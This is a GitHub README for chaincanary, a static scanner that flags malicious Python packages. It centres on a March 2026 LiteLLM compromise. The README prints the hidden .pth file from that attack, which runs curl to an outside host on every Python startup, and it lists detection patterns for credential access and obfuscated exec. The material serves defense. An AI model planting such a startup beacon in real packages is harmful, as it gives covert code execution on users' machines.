# 🛡️ chaincanary

**Stop malicious Python packages before they execute.**

[![CI](https://github.com/allenenli/chaincanary/actions/workflows/ci.yml/badge.svg)](https://github.com/allenenli/chaincanary/actions)
[![PyPI version](https://badge.fury.io/py/chaincanary.svg)](https://badge.fury.io/py/chaincanary)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-green.svg)](LICENSE)

---

## What happened

On **March 24, 2026**, [LiteLLM 1.82.7 was published to PyPI](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign) with a hidden `.pth` file:

```python
# litellm_init.pth — executes on every Python startup
import subprocess, sys
subprocess.Popen(
    ['curl', '-s', 'https://models.litellm.cloud/beacon', '-d', sys.version],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
)
```

This file runs **every time you start Python** — not just during `pip install`. It was downloaded ~95 million times per month. The package was flagged and removed, but not before significant exposure.

chaincanary was built to catch this.

---

## Quick demo

```bash
pip install chaincanary

# Scan LiteLLM 1.82.7 (the compromised version)
chaincanary check litellm 1.82.7
```

```
🔍 chaincanary — Analyzing litellm==1.82.7

╭────────────┬──────────────────────────────┬──────────────────────────────────────╮
│ Severity   │ Rule                         │ Title                                │
├────────────┼──────────────────────────────┼──────────────────────────────────────┤
│ CRITICAL   │ PTH_FILE_INSTALL             │ .pth file installs dangerous code... │
│ CRITICAL   │ PTH_NETWORK_BEACON           │ phone-home on every Python startup   │
│ CRITICAL   │ PTH_SUBPROCESS               │ subprocess on every Python startup   │
╰────────────┴──────────────────────────────┴──────────────────────────────────────╯

  Score: 10.0 / 10.0
  Verdict: ██ MALICIOUS

  Rollback: pip install litellm==1.82.6
```

---

## Install

```bash
pip install chaincanary
```

Requires Python 3.9+. No Docker. No root. Works on Linux, macOS, Windows.

---

## Usage

### Scan a single package

```bash
chaincanary check requests 2.28.0
chaincanary check litellm latest
```

### Audit your entire project

```bash
chaincanary audit requirements.txt
chaincanary audit pyproject.toml
```

Output:
```
🔍 chaincanary audit — requirements.txt (42 packages)

Scanning packages... ████████████████████████ 100%

╭──────────────────┬─────────┬───────┬──────────╮
│ Package          │ Version │ Score │ Verdict  │
├──────────────────┼─────────┼───────┼──────────┤
│ litellm          │ 1.82.7  │ 10.0  │ MALICIOUS│
│ suspicious-lib   │ 0.3.1   │  7.5  │ HIGH_RISK│
│ requests         │ 2.28.0  │  0.0  │ SAFE     │
│ ...              │ ...     │  0.0  │ SAFE     │
╰──────────────────┴─────────┴───────┴──────────╯

✗ 2 package(s) failed the audit.
```

### Compare two versions

```bash
chaincanary diff litellm 1.82.6 1.82.7
```

```
Version diff: litellm 1.82.6 → 1.82.7

  Added files:  litellm_init.pth   ← NEW .pth file
  Removed:      (none)
  [CRITICAL] New .pth file with network beacon
```

### Safe install

```bash
# Scans before installing, blocks if malicious
chaincanary install litellm==1.82.7
```

### Recommended workflow

Use `chaincanary install` for individual packages and `chaincanary audit` in CI.
Aliasing `pip` to `chaincanary` is **not recommended** — it changes timing expectations
(chaincanary downloads + scans before installing) and may break flags like `-e .` or `-r`.

```bash
# Individual package — scan then install
chaincanary install requests==2.32.0

# CI — scan all dependencies before deployment
chaincanary audit requirements.txt --fail-on HIGH_RISK
```

### JSON output (for pipelines)

```bash
chaincanary check litellm 1.82.7 --json-output | jq '.verdict'
# "MALICIOUS"

chaincanary audit requirements.txt --json-output \
  | jq '.results[] | select(.verdict != "SAFE")'
```

---

## GitHub Action

Add to any repo to block malicious packages on every push:

```yaml
# .github/workflows/security.yml
name: Supply Chain Security

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Scan dependencies for supply chain attacks
        uses: allenenli/chaincanary@v0.1.0
        with:
          requirements: requirements.txt
          fail-on: MALICIOUS   # or HIGH_RISK for stricter mode
```

That's it. The action will fail your build if any package matches a known attack pattern.

---

## What chaincanary detects

### .pth attack (LiteLLM 1.82.7 pattern)

`.pth` files in Python site-packages execute **on every interpreter startup** — not just during install. This makes them ideal for persistent backdoors.

chaincanary understands the difference:

| .pth content | Classification | Finding |
|---|---|---|
| Empty | Normal | ✓ silent |
| `/usr/local/lib/...` | Path-only | ✓ silent |
| setuptools distutils shim | Safe code | ⚠ LOW |
| `subprocess.Popen(['curl', ...])` | **Dangerous** | 🔴 CRITICAL |

### Other attack vectors

| What | Where | Severity |
|---|---|---|
| Network call during `pip install` | `setup.py` | HIGH |
| Shell command during `pip install` | `setup.py` | HIGH |
| `exec(base64.decode(...))` obfuscation | anywhere | HIGH |
| Network call on every `import` | `__init__.py` | MEDIUM |
| SSH / AWS credentials access | anywhere | HIGH |
| Path traversal in wheel zip | `.whl` structure | CRITICAL |
| Known malicious SHA256 hash | `.whl` file | CRITICAL |

### What chaincanary does NOT do

- Does not install packages
- Does not execute any package code
- Does not require Docker or privileged access
- Does not send package contents to any server
- Does not replace `pip` — it scans before you decide to install

---

## How it works

```
pip install request      ← your intent
      ↓
chaincanary                 ← intercepts
      ↓
Download wheel (no install, no execute)
      ↓
Static analysis:
  - Zip safety (path traversal, zip bomb)
  - .pth file semantic classifier
  - AST analysis of setup.py / install hooks
  - Obfuscation detection
  - __init__.py delayed-trigger scan
  - SHA256 hash database
      ↓
Score 0–10 → Verdict: SAFE / LOW_RISK / HIGH_RISK / MALICIOUS
      ↓
Block or proceed
```

No sandboxing, no Docker, no kernel modules. Pure Python static analysis that runs in seconds.

---

## Comparison

| Tool | Detection scope | Behavioral .pth analysis | No Docker | Lockfile audit | Speed |
|---|---|---|---|---|---|
| **chaincanary** | Supply chain behavior | ✅ semantic + content | ✅ | ✅ | ~2s/pkg |
| pip-audit | Known CVEs + dep confusion | ❌ | ✅ | ✅ | fast |
| Safety | Known CVEs (advisory DB) | ❌ | ✅ | ✅ | fast |
| Trivy | SBOM + CVEs (image/repo) | ❌ | ✅ | ✅ | slow |
| Bandit | SAST (your source code) | ❌ | ✅ | ❌ | fast |
| socket.dev | Publish-time behavior diff | partial | ✅ | ✅ | fast |

> chaincanary is **not** a CVE scanner — it doesn't check advisory databases.
> It's a **behavioral scanner**: it looks at what a package *does*, not whether
> it appears in a known-bad list. Use it alongside pip-audit/Safety for full coverage.

---

## Known Limitations

chaincanary is a **static behavioral scanner**, not a magic bullet. Know its blind spots:

| Gap | What it means | Workaround |
|-----|---------------|------------|
| No C extension analysis | Malicious `.so`/`.pyd` files aren't scanned | Sandbox (v0.3) |
| No CVE database | Won't catch known vulnerabilities | Use alongside `pip-audit` |
| No dynamic sandbox | Side-effects on `import` not executed | Static signals only (for now) |
| Multi-stage payloads | Pkg that downloads payload at runtime looks clean | Network monitoring (v0.3) |
| Private registries | Can't download from non-public PyPI mirrors | `--offline` flag (v0.2) |

→ Full limitation table: [ROADMAP.md#known-limitations](ROADMAP.md)

---

## Roadmap

| Version | Theme | ETA |
|---------|-------|-----|
| **post-0.1** | Scoring fixes, DNS exfil, typosquatting, git deps | ✅ done |
| **v0.2** | Hash feed, SARIF output, `--timeout`, pre-commit hook | soon |
| **v0.3** | Lightweight sandbox, package reputation, npm/cargo | later |

→ Full plan: [ROADMAP.md](ROADMAP.md)

---

## Contributing

```bash
git clone https://github.com/allenenli/chaincanary
cd chaincanary
pip install -e ".[dev]"
pytest tests/
```

PRs welcome — especially:
- New malicious hash signatures
- Detection rules for new attack patterns  
- False positive reports (real packages that chaincanary misflags)

---

## License

Apache 2.0. See [LICENSE](LICENSE).

---

*Built after the [LiteLLM supply chain attack](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign), March 2026.*
